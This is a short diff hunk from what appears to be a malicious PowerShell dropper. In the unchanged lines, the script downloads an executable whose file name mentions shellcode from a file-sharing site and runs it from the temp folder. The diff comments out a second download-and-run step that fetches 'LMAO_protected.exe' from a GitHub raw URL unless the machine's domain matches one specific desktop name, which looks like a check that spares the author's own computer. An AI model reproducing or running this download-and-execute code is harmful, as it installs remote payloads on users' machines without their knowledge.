@@ -42,8 +42,8 @@ Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_
 Start-Process -FilePath "$temp\s.exe"
 
 if ($env:USERDOMAIN -ne "DESKTOP-VIGQLDD") {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skidd.exe"
-    Start-Process -FilePath "$temp\skidd.exe"
+    # Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skidd.exe"
+    # Start-Process -FilePath "$temp\skidd.exe"
 }
 
 
